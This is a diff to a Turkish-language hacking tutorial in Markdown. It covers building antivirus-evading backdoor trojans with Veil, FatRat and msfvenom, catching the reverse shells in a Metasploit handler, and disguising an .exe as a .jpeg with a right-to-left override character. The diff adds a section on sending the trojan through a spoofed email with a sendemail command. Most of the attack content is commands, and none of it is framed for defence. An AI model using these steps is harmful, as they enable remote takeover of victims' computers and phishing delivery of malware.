@@ -50,6 +50,8 @@
     - [Hata](#Hata)
   - [Trojan ile Görsel Birleştirme](#Trojan-ile-Görsel-Birleştirme)
     - [Trojanin Uzantısını Değiştirme](#Trojanin-Uzantısını-Değiştirme)
+  - [Trojani Fake E-mail ile Yollama](#Trojani-Fake-E-mail-ile-Yollama)
+    - [Terminal Üzerinden Fake E-Mail Yollama](#Terminal-Üzerinden-Fake-E-Mail-Yollama)
 - [10-Sosyal Mühendislik](#Sosyal-Mühendislik)
   - [Maltego](#Maltego)
 - [11
@@ -367,10 +369,10 @@ Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketler
 ### Veil
 
 1. Veil opt içinde kurulu olduğu için ```/opt``` içine giriyoruz
-2.```python3 veil.py``` 
-3.```>>use 1``` 
-4.```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
-5.```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
+2. ```python3 veil.py``` 
+3. ```>>use 1``` 
+4. ```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
+5. ```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
 6. Oluşturulan trojan'ın konumunu görürüz (var/lib/veil/output/complied) 
 7. Oluşturduğumuz trojan'ı ```antiscan.me``` gibi sitelerde test edebiliriz
 
@@ -387,25 +389,24 @@ Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketler
 
 ### Fatrat
 
-1.```fatrat``` ile framework'ü açıyoruz
+1. ```fatrat``` ile framework'ü açıyoruz
 2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
 3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
-4.```LHOST, LPORT``` giriyoruz
+4. ```LHOST, LPORT``` giriyoruz
 5. Trojan adını seçiyoruz
 6. ```32bit/64bit``` seçiyoruz
 7. Trojan'ı oluşturuyoruz ve dinliyoruz
 
 > ### Dinlemek için
 
-1.```msfconsole``` 
-2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
-3.```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
-4.```LHOST ve LPORT```'u değiştiriyoruz
-5.```exploit -j -z``` ile dinlemeye başlıyoruz 
+1. ```msfconsole``` 
+2. ```use exploit/multi/handler``` diyerek payload tanımlıyoruz
+3. ```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
+4. ```LHOST ve LPORT```'u değiştiriyoruz
+5. ```exploit -j -z``` ile dinlemeye başlıyoruz 
 6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz
 
 ### Msfvenom
-
 
 ```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```
 ```
@@ -453,6 +454,25 @@ lport: ngrok'dan kopyaladığımız PORT
 3. ```gepj.exe``` kısımını seçip ```ctrl+v``` yapıyoruz ve dosya uzantısı ```.jpeg``` olarak gözüküyor
 
 ```right-to-left``` characters kısmında yoksa google'a ```unicode-table``` yazıp çıkan siteden kopyalabiliriz ```U+202E```
+
+### Trojani Fake E-mail ile Yollama
+
+Google'a ```send anonymous e-mail``` aratıyoruz. Göndermek istediğimiz trojan'i .zip dosyasına çevirerek mail ile yollayabiliriz
+
+> ### Terminal Üzerinden Fake E-Mail Yollama
+
+```sendemail -f admin@gmail -t hedefmailadresi@gmail.com -s smtp.gmail.com:587 -xu gerçekmailadresi@gmail.com -xp MY-PASSWORD -u test email -m your gmail has been hacked```
+```
+-f: Mail'i Gönderen Fake E-mail Adresi
+-t: Hedef E-mail Adresi
+-s: Mail'in Smtp'si (Google Üzerinde Bakılabilir)
+-xu: Kendi E-mail Adresimiz
+-xp: Kendi E-mail Adresimizin Şifresi
+-u: Mail'in Başlığı
+-m: Mail'in İçeriği
+```
+
+
 
 # 10-Sosyal Mühendislik
 
